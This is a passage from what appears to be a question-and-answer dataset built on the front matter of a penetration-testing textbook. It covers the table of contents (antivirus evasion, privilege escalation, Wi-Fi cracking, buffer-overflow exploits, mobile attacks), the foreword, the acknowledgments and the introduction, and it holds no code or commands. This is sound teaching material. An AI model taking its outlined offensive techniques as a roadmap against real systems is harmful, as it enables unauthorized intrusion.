. . . 247\nSingle or Mass Email . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 247\nCreating the Template  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 248\nSetting the Target  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 248\nSetting Up a Listener  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 249\nWeb Attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 250\nMass Email Attacks  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 253\nMultipronged Attacks  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 255\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 255\n12\nBYPassing antiVirus aPPLiCations 257\nTrojans . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 258\nMsfvenom  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 258\nHow Antivirus Applications Work  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 260\nMicrosoft Security Essentials  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 261\nVirusTotal  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 262\nGetting Past an Antivirus Program  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 263\nEncoding . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 263\nCustom Cross Compiling  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 266\nEncrypting Executables with Hyperion . . . . . . . . . . . . . . . . . . . . . . . . . . . . 269\nEvading Antivirus with Veil-Evasion  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 270\nxiv Contents in Detail\nHiding in Plain Sight . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 274\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 274\n13\nPost exPLoitation 277\nMeterpreter . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 278\nUsing the upload Command . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 279\ngetuid  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 279\nOther Meterpreter Commands  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 280\nMeterpreter Scripts . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 280\nMetasploit Post-Exploitation Modules  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 281\nRailgun . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 283\nLocal Privilege Escalation  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 283\ngetsystem on Windows  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 283\nLocal Escalation Module for Windows . . . . . . . . . . . . . . . . . . . . . . . . . . . . 284\nBypassing UAC on Windows . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 285\nUdev Privilege Escalation on Linux . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 287\nLocal Information Gathering  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 291\nSearching for Files  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 291\nKeylogging  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 292\nGathering Credentials . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 292\nnet Commands . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 294\nAnother Way In  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 295\nChecking Bash History . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 295\nLateral Movement . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 296\nPSExec . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 296\nPass the Hash  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 298\nSSHExec  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 299\nToken Impersonation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 300\nIncognito  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 301\nSMB Capture  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 302\nPivoting  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 304\nAdding a Route in Metasploit . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 305\nMetasploit Port Scanners  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 306\nRunning an Exploit through a Pivot  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 306\nSocks4a and ProxyChains  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 307\nPersistence  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 309\nAdding a User  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 309\nMetasploit Persistence  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 310\nCreating a Linux cron Job . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 311\nSummary  . . . . . . . . . . . . . . .\n\n. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 311\n14\nweB aPPLiCation testing 313\nUsing Burp Proxy  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 314\nSQL Injection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 319\nTesting for SQL Injection Vulnerabilities  . . . . . . . . . . . . . . . . . . . . . . . . . . . 320\nExploiting SQL Injection Vulnerabilities  . . . . . . . . . . . . . . . . . . . . . . . . . . . 321\nUsing SQLMap . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 321\nXPath Injection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 323\nContents in Detail xv\nLocal File Inclusion . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 324\nRemote File Inclusion  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 327\nCommand Execution . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 327\nCross-Site Scripting . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 329\nChecking for a Reflected XSS Vulnerability . . . . . . . . . . . . . . . . . . . . . . . . . 330\nLeveraging XSS with the Browser Exploitation Framework  . . . . . . . . . . . . . . 331\nCross-Site Request Forgery  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 335\nWeb Application Scanning with w3af  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 335\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 337\n15\nwireLess attaCks 339\nSetting Up . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 339\nViewing Available Wireless Interfaces . . . . . . . . . . . . . . . . . . . . . . . . . . . . 340\nScan for Access Points . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 341\nMonitor Mode . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 341\nCapturing Packets  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 342\nOpen Wireless  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 343\nWired Equivalent Privacy  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 343\nWEP Weaknesses . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 346\nCracking WEP Keys with Aircrack-ng  . . . . . . . . . . . . . . . . . . . . . . . . . . . . 347\nWi-Fi Protected Access  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 350\n\nWPA2  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 351\nThe Enterprise Connection Process  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 351\nThe Personal Connection Process  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 351\nThe Four-Way Handshake  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 352\nCracking WPA/WPA2 Keys  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 353\nWi-Fi Protected Setup . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 356\nProblems with WPS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 356\nCracking WPS with Bully . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 357\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 357\nPart iV\nexPLoit deVeLoPment\n16\na staCk-Based BuFFer oVerFLow in Linux 361\nMemory Theory . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 362\nLinux Buffer Overflow . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 364\nA Vulnerable Program  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 365\nCausing a Crash . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 366\nRunning GDB  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 367\nCrashing the Program in GDB  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 372\nxvi Contents in Detail\nControlling EIP  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 373\nHijacking Execution . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 375\nEndianness . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 376\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 378\n17\na staCk-Based BuFFer oVerFLow in windows 379\nSearching for a Known Vulnerability in War-FTP  . . . . . . . . . . . . . . . . . . . . . . . . . . . 380\nCausing a Crash  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 382\nLocating EIP . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 384\nGenerating a Cyclical Pattern to Determine Offset . . . . . . . . . . . . . . . . . . . . 385\nVerifying Offsets . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 388\nHijacking Execution  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 390\nGetting a Shell . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 395\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 400\n18\nstruCtured exCePtion handLer oVerwrites 401\nSEH Overwrite Exploits . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 403\nPassing Control to SEH . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 407\nFinding the Attack String in Memory  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 408\n\nPOP POP RET  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 411\nSafeSEH . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 412\nUsing a Short Jump  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 416\nChoosing a Payload . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 418\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 419\n19\nFuzzing, Porting exPLoits, and metasPLoit moduLes 421\nFuzzing Programs  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 421\nFinding Bugs with Code Review  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 422\nFuzzing a Trivial FTP Server  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 422\nAttempting a Crash . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 424\nPorting Public Exploits to Meet Your Needs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 427\nFinding a Return Address . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 429\nReplacing Shellcode  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 430\nEditing the Exploit . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 430\nWriting Metasploit Modules  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 432\nA Similar Exploit String Module  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 435\nPorting Our Exploit Code . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 435\nExploitation Mitigation Techniques . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 439\nStack Cookies . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 440\nAddress Space Layout Randomization  . . . . . . . . . . . . . . . . . . . . . . . . . . . 440\nData Execution Prevention  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 441\nMandatory Code Signing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 441\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 442\nContents in Detail xvii\nPart V\nMobile Hacking\n20\nUsing tHe sMartPHone Pentest FraMework 445\nMobile Attack Vectors . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 446\nText Messages  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 446\nNear Field Communication . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 446\nQR Codes  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 447\nThe Smartphone Pentest Framework  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 447\nSetting Up SPF  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 447\nAndroid Emulators . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 449\nAttaching a Mobile Modem  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 449\nBuilding the Android App  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 449\nDeploying the App  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 450\nAttaching the SPF Server and App . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 452\nRemote Attacks  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 453\nDefault iPhone SSH Login  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 453\nClient-Side Attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 454\nClient-Side Shell  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 454\nUSSD Remote Control  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 456\nMalicious Apps  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 458\nCreating Malicious SPF Agents . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 459\nMobile Post Exploitation  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 464\nInformation Gathering . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 464\nRemote Control . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 465\nPivoting Through Mobile Devices  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 466\nPrivilege Escalation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 471\nSummary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 472\nresoUrces 473\nindex 477\nxviii Contents in Detail\nfore worD\nI met Georgia Weidman at a conference almost two\nyears ago. Intrigued by what she was doing in the\nmobile device security field, I started following her\nwork. At nearly every conference I’ve attended since\nthen, I’ve run into Georgia and found her passion-\nately sharing knowledge and ideas about mobile\ndevice security and her Smartphone Pentesting\nFramework. In fact, mobile device security is only one of the things Georgia does. Georgia performs penetration tests for a living; travels the world to deliver\ntraining on pentesting, the Metasploit Framework, and mobile device secu-\nrity; and presents novel and innovative ideas on how to assess the security of\nmobile devices at conferences. Georgia spares no effort in diving deeper into more advanced top-\nics and working hard to learn new things. She is a former student of my\n(rather challenging) Exploit Development Bootcamp, and I can attest to\nthe fact that she did very well throughout the entire class. Georgia is a true\nhacker—always willing to share her findings and knowledge with our great\ninfosec community—and when she asked me to write the foreword to this\nbook, I felt very privileged and honored. As a chief information security officer, a significant part of my job\nrevolves around designing, implementing, and managing an information\nsecurity program. Risk management is a very important aspect of the pro-\ngram because it allows a company to measure and better understand its\ncurrent position in terms of risk. It also allows a company to define priori-\nties and implement measures to decrease risk to an acceptable level, based\non the company’s core business activities, its mission and vision, and legal\nrequirements. Identifying all critical business processes, data, and data flows inside\na company is one of the first steps in risk management. This step includes\ncompiling a detailed inventory of all IT systems (equipment, networks,\napplications, interfaces, and so on) that support the company’s critical busi-\nness processes and data from an IT perspective. The task is time consuming\nand it’s very easy to forget about certain systems that at first don’t seem to\nbe directly related to supporting critical business processes and data, but\nthat are nonetheless critical because other systems depend on them. This\ninventory is fundamentally important and is the perfect starting point for a\nrisk-assessment exercise. One of the goals of an information-security program is to define what\nis necessary to preserve the desired level of confidentiality, integrity, and\navailability of a company’s IT systems and data. Business process owners\nshould be able to define their goals, and our job as information-security\nprofessionals is to implement measures to make sure we meet these goals\nand to test how effective these measures are.",
    "question": "What is the main purpose of the information security program mentioned in the foreword?",
    "summary": "The text covers the use of Metasploit and other tools for exploit development, including payload creation, vulnerability scanning, and social engineering techniques. It also discusses methods for bypassing antivirus software and performing wireless and mobile device attacks. The content provides detailed information on various aspects of penetration testing, such as buffer overflow exploits, structured exception handler overwrites, and mobile hacking with the Smartphone Pentest Framework."
  },
  {
    "start": 11,
    "end": 16,
    "text": "There are a few ways to determine the actual risk to the confidentiality,\nintegrity, and availability of a company’s systems. One way is to perform a\ntechnical assessment to see how easy it would be for an adversary to under-\nmine the desired level of confidentiality, break the integrity of systems, and\ninterfere with the availability of systems, either by attacking them directly\nor by attacking the users with access to these systems. That’s where a penetration tester (pentester, ethical hacker, or what-\never you want to call it) comes into play. By combining knowledge of how\nsystems are designed, built, and maintained with a skillset that includes\nfinding creative ways around defenses, a good pentester is instrumental in\nidentifying and demonstrating the strength of a company’s information-\nsecurity posture. If you would like to become a penetration tester or if you are a systems/\nnetwork administrator who wants to know more about how to test the\nsecurity of your systems, this book is perfect for you. You’ll learn some of\nthe more technical phases of a penetration test, beginning with the initial\ninformation-gathering process. You’ll continue with explanations of how to\nexploit vulnerable networks and applications as you delve deeper into the\nnetwork in order to determine how much damage could be done. This book is unique because it’s not just a compilation of tools with\na discussion of the available options. It takes a very practical approach,\nxx Foreword\ndesigned around a lab—a set of virtual machines with vulnerable applica-\ntions—so you can safely try various pentesting techniques using publicly\navailable free tools. Each chapter starts with an introduction and contains one or more\nhands-on exercises that will allow you to better understand how vulner-\nabilities can be discovered and exploited. You’ll find helpful tips and tricks\nfrom an experienced professional pentester, real-life scenarios, proven tech-\nniques, and anecdotes from actual penetration tests. Entire books can be written (and have been) on the topics covered in\neach chapter in this book, and this book doesn’t claim to be the Wikipedia\nof pentesting. That said, it will certainly provide you with more than a first\npeek into the large variety of attacks that can be performed to assess a tar-\nget’s security posture. Thanks to its guided, hands-on approach, you’ll learn\nhow to use the Metasploit Framework to exploit vulnerable applications and\nuse a single hole in a system’s defenses to bypass all perimeter protections,\ndive deeper into the network, and exfiltrate data from the target systems. You’ll learn how to bypass antivirus programs and perform efficient social-\nengineering attacks using tools like the Social-Engineer Toolkit. You’ll see\nhow easy it would be to break into a corporate Wi-Fi network, and how to use\nGeorgia’s Smartphone Pentest Framework to assess how damaging a com-\npany’s bring your own device policy (or lack thereof) could be. Each chap-\nter is designed to trigger your interest in pentesting and to provide you with\nfirst-hand insight into what goes on inside a pentester’s mind. I hope this book will spark your creativity and desire to dive deeper into\ncertain areas; to work hard and learn more; and to do your own research\nand share your knowledge with the community. As technology develops,\nenvironments change, and companies increasingly rely on technology\nto support their core business activities, the need for smart pentesters\nwill increase. You are the future of this community and the information-\nsecurity industry. Good luck taking your first steps into the exciting world of pentesting. I’m sure you will enjoy this book! Peter “corelanc0d3r” Van Eeckhoutte\nFounder of Corelan Team\nForeword xxi\naCknowleDgments\nMany thanks go to the following people and organizations (in no particular\norder). My parents, who have always supported my career endeavors—including\npaying for me to go to my first conference and get my first certifications when\nI was still a broke college student. Collegiate Cyber Defense Competition, particularly the Mid-Atlantic\nregion Red Team, for helping me find what I wanted to do with my life. ShmooCon for accepting my first talk ever and also being the first con-\nference I ever attended. Peiter “Mudge” Zatko and everyone who involved in the DARPA Cyber\nFast Track program for giving me the opportunity to start my own company\nand build the Smartphone Pentest Framework. James Siegel for being my lucky charm and making sure I get on stage\non time at events. Rob Fuller for taking the time to come to James Madison University\nand visit the CCDC team after the competition. That day I decided to make\na career of infosec. John Fulmer for helping me with the crypto details in the wireless chapter. Rachel Russell and Micheal Cottingham for being my first infosec buddies. Jason and Rachel Oliver for technical and content review, and also for\nmaking the perfect smoky eye look at ShmooCon and Black Hat. Joe McCray, my infosec big brother, for being my mentor as I learn to\nnavigate the infosec business. Leonard Chin for giving me my first big international conference expe-\nrience and the confidence to become a conference trainer. Brian Carty for helping me build my online lab. Tom Bruch for letting me live in his house when I had no job and my\nDARPA money hadn’t come through yet. Dave Kennedy for providing introductions for several great opportunities. Grecs for helping me market my classes on his website. Raphael Mudge for getting me in touch with the DARPA Cyber Fast\nTrack program and many other great opportunities. Peter Hesse and Gene Meltser for forcing me to have the courage to\nmove up at key junctures in my career. Jayson Street for being a pickier eater than me so I almost pass as nor-\nmal at speaker dinners in foreign countries. You are the best. Ian Amit for recommending me for some great speaking slots when I\nwas just starting out. Martin Bos for being awesome. You know what I mean. Jason Kent for all those global premier upgrades and wonderful tau-\ntologies for definitions, some of which appear herein. My professors at James Madison University, particularly Samuel T. Redwine—you inspired me more than you will ever know. The people at No Starch Press for their help and support in developing\nthis book, including Alison Law, Tyler Ortman, and KC Crowell. Special\nthanks to my editor and No Starch’s publisher, Bill Pollock. xxiv Acknowledgments\nintroDuCtion\nI decided to write this book because it was the sort\nof book I wish I had had when I was starting out in\ninformation security. Though there are certainly\nmore informative websites out there than when I\nfirst started, I still find it’s difficult for a beginner to\nknow what to read first and where to get the expected prerequisite skills. Likewise, there are a lot of books on the market—several great ones on\nadvanced topics, which require some background knowledge, and many\ngood books aimed at beginners, which cover a significant amount of theory. But I haven’t found anything that says everything I want to say to the aspiring\npentester who emails me looking for a place to start in information security. In my teaching career I’ve always found that my favorite course to\nteach is Introduction to Pentesting. The students always have a thirst for\nknowledge that is lots of fun to be around. Thus, when I was approached\nby No Starch Press to write a book, this was the book I proposed. When I\nannounced it, many people assumed I was writing a mobile security book,\nbut while I considered that, I thought an introduction to pentesting would\nmake the biggest impact on the audience I most wanted to reach. a note of thanks\nA book like this would not be possible without many years of dedicated\nwork on the part of the information security community. The tools and\ntechniques discussed throughout this book are some of the ones my col-\nleagues and I use regularly on engagements, and they’ve been developed\nthrough the combined efforts of pentesters and other security experts all\nover the world. I’ve contributed to some of these open source projects (such\nas Mona.py, which we’ll use in the exploit development chapters), and I hope\nthis book will inspire you to do the same. I want to take this opportunity to thank Offensive Security for creating\nand maintaining the Kali Linux pentesting distribution used widely in the\nfield and throughout this book. A huge amount of credit also goes to the\ncore developers of the Metasploit Framework, as well as its numerous com-\nmunity contributors. Thanks too to all the pentesters and researchers who\nhave shared their knowledge, discoveries, and techniques with the com-\nmunity so that we can use them to assess the security posture of our clients\nmore effectively, and so that teachers like me can use them with our students. Thanks as well to the creators of the great books, blog posts, courses,\nand so on that have helped me achieve my goal of becoming a professional\npentester. I now hope to share the knowledge I’ve gained with other aspir-\ning pentesters. You’ll find a list of additional resources (including courses and blogs)\nat the end of this book. These are some of the resources that I have found\nhelpful on my own journey in infosec, and I encourage you to use them to\nlearn more about the many penetration testing topics covered in this book. I hope you enjoy your journey as much as I have. about this Book\nTo work through this book, you will need to know how to install software\non your computer. That’s it. You don’t need to be a Linux expert or know\nthe nitty-gritty of how networking protocols work. When you encounter\na topic that is not familiar to you, I encourage you to do some outside\nresearch beyond my explanations if you need to—but we will walk step-by-\nstep through all the tools and techniques that may be new to you, starting\nwith the Linux command line. When I started in information security, the\nclosest thing I’d ever done to hacking was making the Windows XP pre-SP2\nStart menu say Georgia instead of Start. And I was pretty proud of myself at\nthe time. And then I went to the Collegiate Cyber Defense Competition and all\nthe Red Team members were using the command line at rapid speed and\nmaking pop-up windows appear on my desktop from across a crowded\nroom. All I knew was that I wanted to be like them. There was a lot of hard\nwork between then and now, and there will be much more hard work as I\nendeavor to reach the highest level of information security. I only hope that\nwith this book I can inspire more people to follow the same path. xxvi Introduction\nPart I: The Basics\nIn Chapter 0, we start out with some basic definitions of the phases of pene-\ntration testing. In Chapter 1, we build our small practice laboratory, which we\nwill use to work through the exercises in this book. With many books, it’s pos-\nsible to just download a few programs onto your existing platform, but to sim-\nulate a penetration test, our approach is a bit more involved. I recommend\nthat you take the time to set up your lab and work through the hands-on\nexamples with me. Though this book can serve as a reference and reminder\nin the field, I believe it is best to first practice your pentesting skills at home. In Chapter 2, we start with the basics of using Kali Linux and Linux\noperating systems in general. Next, Chapter 3 covers the basics of program-\nming. Some readers may already have a working knowledge in these areas\nand can skip past them. When I first started out, I had some programming\nexperience in C and Java, but I didn’t have a background in scripting, and\nI had practically no background in Linux—a skillset that was assumed by\nmost of the hacking tutorials I encountered. Thus, I have provided a primer\nhere. If you are new to these areas, please do continue your studies outside\nof this book. Linux-based operating systems are becoming more and more\nprevalent as the platforms for mobile devices and web services, so skills in\nthis area will benefit you even if you don’t pursue a career in information\nsecurity. Likewise, knowing how to script your common tasks can only make\nyour life easier, regardless of your career. We look at the basics of using the Metasploit Framework, a tool we will\nleverage throughout this book, in Chapter 4. Though we will also learn to\nperform many tasks without Metasploit, it is a go-to tool for many pentest-\ners in the field and is constantly evolving to include the latest threats and\ntechniques. Part II: Assessments\nNext we start working through a simulated penetration test. In Chapter 5,\nwe begin by gathering data about our target—both by searching freely\navailable information online and by engaging our target systems. We then\nstart searching for vulnerabilities using a combination of querying the sys-\ntems and research in Chapter 6. In Chapter 7, we look at techniques to cap-\nture traffic that might include sensitive data. Part III: Attacks\nNext, in Chapter 8, we look at exploiting the vulnerabilities we found on\nthe network with a variety of tools and techniques, including Metasploit and\npurely manual exploitation. We then look at methods for attacking what is\noften the weakest link in a network’s security—password management—in\nChapter 9. We next look at some more advanced exploitation techniques. Not\nall vulnerabilities are in a service listening on the network. Web browsers,\nPDF readers, Java, Microsoft Office—they all have been subject to security\nissues. As clients work harder to secure their networks, attacking client-\nside software may be the key to getting a foothold in the network. We look\nIntroduction xxvii\nat leveraging client-side attacks in Chapter 10. In Chapter 11, we combine\nclient-side attacks with a look at social engineering, or attacking the human\nelement—the part of the environment that cannot be patched.\n\nAfter all, with\nclient-side attacks, the software in question must open a malicious file of\nsome sort, so we must convince the user to help us out. In Chapter 12, we\nlook at some methods of bypassing antivirus software, as many of your cli-\nents will deploy it. If you have high enough privileges on a system, you may\nbe able to just turn antivirus programs off, but a better solution is to breeze\nright past antivirus programs undetected, which can be done even if you\nare saving malicious programs to the hard drive. In Chapter 13, we pick up with the next phase of our penetration test,\npost exploitation. Some say the pentest truly begins after exploitation. This\nis where you leverage your access to find additional 